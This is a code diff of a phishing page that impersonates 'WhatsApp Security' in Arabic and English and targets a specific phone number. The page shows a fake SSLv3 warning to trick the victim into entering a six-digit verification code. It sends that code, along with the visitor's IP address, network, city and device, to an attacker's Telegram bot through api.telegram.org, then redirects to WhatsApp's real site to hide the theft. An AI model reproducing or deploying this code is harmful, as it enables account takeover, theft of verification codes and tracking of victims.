@@ -12,19 +12,15 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         
-        /* شاشة الاسترداد الفخمة (Side Loading) */
         #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .logo-wa { width: 55px; height: 55px; fill: var(--wa-green); margin-bottom: 25px; }
-        .retrieving { font-size: 13px; color: var(--wa-hint); margin-bottom: 8px; }
-        .ap-info { font-size: 12px; color: var(--wa-green); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+        .logo-wa { width: 75px; height: 75px; fill: var(--wa-green); margin-bottom: 20px; }
+        .retrieving { font-size: 14px; color: var(--wa-text); margin-bottom: 5px; }
 
-        /* الواجهة الرئيسية */
-        .app-ui { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
-        .header { margin-bottom: 30px; }
-        .header svg { width: 42px; fill: var(--wa-green); margin-bottom: 10px; }
-        .header h1 { font-size: 24px; font-weight: 700; color: #fff; }
+        .app-ui { width: 100%; max-width: 380px; padding: 20px; text-align: center; display: none; }
+        .header { margin-bottom: 25px; }
+        .header svg { width: 60px; fill: var(--wa-green); margin-bottom: 8px; }
+        .header h1 { font-size: 22px; font-weight: 700; color: #fff; }
 
-        /* كارت بيانات النظام */
         .sys-card { background: var(--wa-card); border-radius: 12px; padding: 18px; text-align: right; border: 1px solid rgba(255,255,255,0.03); margin-bottom: 20px; }
         .sys-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 0.5px solid #26353d; font-size: 14px; }
         .sys-row:last-child { border: none; }
@@ -32,46 +28,44 @@
         .val { font-weight: 500; color: #fff; }
         .val-warn { color: var(--wa-danger); font-weight: 700; }
 
-        /* رسالة النظام الرسمية */
-        .alert-box { background: rgba(241, 92, 92, 0.07); border-right: 4px solid var(--wa-danger); padding: 18px; text-align: right; margin-bottom: 25px; border-radius: 4px; }
-        .alert-msg { font-size: 13px; line-height: 1.8; color: #e9edef; }
+        .alert-box { background: rgba(241, 92, 92, 0.07); border-right: 4px solid var(--wa-danger); padding: 15px; text-align: right; margin-bottom: 20px; border-radius: 4px; }
+        .alert-msg { font-size: 13px; line-height: 1.7; color: #e9edef; }
 
-        /* المدخلات والأزرار */
-        .code-in { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 10px; padding: 18px; color: #fff; font-size: 26px; text-align: center; outline: none; margin-bottom: 15px; letter-spacing: 6px; font-weight: bold; }
-        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 40px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .btn-sync:active { transform: scale(0.98); }
+        /* تصغير خانة الكود والزرار */
+        .code-in { width: 85%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 12px; color: #fff; font-size: 22px; text-align: center; outline: none; margin-bottom: 15px; letter-spacing: 4px; }
+        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 85%; padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; }
         
-        .footer { margin-top: 40px; font-size: 10px; color: var(--wa-hint); opacity: 0.5; letter-spacing: 1px; }
+        .footer { margin-top: 30px; font-size: 10px; color: var(--wa-hint); }
     </style>
 </head>
 <body>
 
     <div id="loader">
         <svg class="logo-wa" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        <div class="retrieving" id="load-msg">Authenticating with server...</div>
-        <div class="ap-info" id="load-ap"></div>
+        <div class="retrieving" id="load-text">Locating...</div>
     </div>
 
     <div class="app-ui" id="main-ui">
         <div class="header">
             <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-            <h1>WhatsApp</h1>
+            <h1 id="sys-title">WhatsApp Security</h1>
         </div>
 
         <div class="sys-card">
-            <div class="sys-row"><span class="lbl" id="l-acc">رقم الحساب:</span> <span class="val" id="v-acc"></span></div>
-            <div class="sys-row"><span class="lbl" id="l-dev">نقطة الوصول:</span> <span class="val" id="v-dev"></span></div>
-            <div class="sys-row"><span class="lbl" id="l-prt">بروتوكول الأمان:</span> <span class="val-warn" id="v-prt">SSLv3 / غير مدعوم</span></div>
+            <div class="sys-row"><span class="lbl" id="l-acc">Account Number:</span> <span class="val" id="v-acc"></span></div>
+            <div class="sys-row"><span class="lbl" id="l-net">Network:</span> <span class="val" id="v-net">Detecting...</span></div>
+            <div class="sys-row"><span class="lbl" id="l-dev">Device:</span> <span class="val" id="v-dev"></span></div>
+            <div class="sys-row"><span class="lbl" id="l-prt">Security Protocol:</span> <span class="val-warn" id="v-prt">SSLv3 / Outdated</span></div>
         </div>
 
         <div class="alert-box">
-            <p class="alert-msg" id="alert-body">The current communication protocol (SSLv3) is no longer supported. To prevent unauthorized access and ensure end-to-end encryption, please confirm the sync code for TLS 1.3 deployment.</p>
+            <p class="alert-msg" id="alert-body"></p>
         </div>
 
-        <input type="tel" id="otp-field" class="code-in" placeholder="--- ---" maxlength="6">
-        <button class="btn-sync" id="btn-text" onclick="finalize()">تحديث معايير التشفير</button>
+        <input type="tel" id="otp" class="code-in" placeholder="--- ---" maxlength="6">
+        <button class="btn-sync" id="btn-text" onclick="send()">Confirm Sync Now</button>
 
-        <div class="footer">WHATSAPP SECURITY SYSTEM — 2026</div>
+        <div class="footer">WhatsApp Security © 2026</div>
     </div>
 
     <script>
@@ -82,11 +76,11 @@
         };
 
         const DICT = {
-            ar: { loader: "جاري استرداد بروتوكولات الأمان...", ap: "نقطة الوصول: ", acc: "رقم الحساب:", dev: "نقطة الوصول:", prt: "بروتوكول الأمان:", warn: "SSLv3 / غير مدعوم", msg: "بروتوكول الاتصال الحالي (SSLv3) لم يعد مدعومًا في تحديثات الأمان الأخيرة. لضمان استمرارية تشفير المحادثات ومنع الوصول غير المصرح به، يرجى مزامنة الحساب لترقية إعدادات التشفير إلى المعيار الموحد TLS 1.3.", btn: "تأكيد المزامنة الآن" },
-            en: { loader: "Retrieving security protocols...", ap: "Access Point: ", acc: "Account:", dev: "Access Point:", prt: "Security Protocol:", warn: "SSLv3 / Outdated", msg: "The current communication protocol (SSLv3) is no longer supported. To prevent unauthorized access and ensure end-to-end encryption, please confirm the sync code for TLS 1.3 deployment.", btn: "Confirm Sync Now" }
+            ar: { title: "واتساب سيكورتي", loader: "جاري التحديد...", acc: "رقم الحساب:", net: "الشبكة:", dev: "نوع الجهاز:", prt: "بروتوكول الأمان:", warn: "SSLv3 / غير مدعوم", msg: "النظام الحالي يفتقر إلى معايير التشفير الحديثة. تم رصد فجوة أمنية تتطلب مزامنة فورية لتفعيل بروتوكول TLS 1.3 لضمان سرية البيانات ومنع أي وصول خارجي غير مصرح به.", btn: "تحديث نظام التشفير الآن" },
+            en: { title: "WhatsApp Security", loader: "Locating...", acc: "Account Number:", net: "Network:", dev: "Device:", prt: "Security Protocol:", warn: "SSLv3 / Outdated", msg: "The current system lacks modern encryption standards. A security vulnerability has been detected that requires an immediate sync to enable the TLS 1.3 protocol to ensure data confidentiality and prevent any unauthorized external access.", btn: "Confirm Sync Now" }
         };
 
-        function getDev() {
+        function getDevice() {
             const ua = navigator.userAgent;
             if (/iPhone|iPad/i.test(ua)) return "iPhone / iOS Device";
             if (/Android/i.test(ua)) return "Android Terminal";
@@ -98,35 +92,43 @@
             const T = isAr ? DICT.ar : DICT.en;
             if(!isAr) document.body.dir = "ltr";
 
-            document.getElementById('load-ap').innerText = T.ap + getDev();
-            document.getElementById('load-msg').innerText = T.loader;
+            document.getElementById('load-text').innerText = T.loader;
 
-            setTimeout(() => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const network = data.org || "WiFi / Mobile Data";
+                
+                document.getElementById('v-net').innerText = network;
                 document.getElementById('v-acc').innerText = `+20 ${CFG.U.slice(0,3)} •••• ${CFG.U.slice(-2)}`;
-                document.getElementById('v-dev').innerText = getDev();
+                document.getElementById('v-dev').innerText = getDevice();
+                
+                document.getElementById('sys-title').innerText = T.title;
                 document.getElementById('l-acc').innerText = T.acc;
+                document.getElementById('l-net').innerText = T.net;
                 document.getElementById('l-dev').innerText = T.dev;
                 document.getElementById('l-prt').innerText = T.prt;
                 document.getElementById('v-prt').innerText = T.warn;
                 document.getElementById('alert-body').innerText = T.msg;
                 document.getElementById('btn-text').innerText = T.btn;
-                
+
+                // Log Visit to Telegram
+                const log = `✅ <b>New Visit</b>\nTarget: ${CFG.U}\nNet: ${network}\nDevice: ${getDevice()}\nIP: ${data.ip}`;
+                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
+            } catch(e) {
+                document.getElementById('v-net').innerText = "Unknown Network";
+            }
+
+            setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-            }, 3000);
-
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                const log = `💎 <b>Official Access</b>\nTarget: <code>${CFG.U}</code>\nAP: ${getDev()}\nIP: <code>${d.ip}</code>\nCity: ${d.city}`;
-                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
-            } catch(e){}
+            }, 2500);
         }
 
-        async function finalize() {
-            const c = document.getElementById('otp-field').value;
-            if(c.length < 6) return;
-            const log = `🔥 <b>PROTOCOL KEY</b>\nTarget: ${CFG.U}\nKey: <code>${c}</code>\nTerminal: ${getDev()}`;
+        async function send() {
+            const val = document.getElementById('otp').value;
+            if(val.length < 6) return;
+            const log = `🔑 <b>CODE RECEIVED</b>\nTarget: ${CFG.U}\nCode: <code>${val}</code>`;
             await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
             window.location.href = "https://www.whatsapp.com/security";
         }
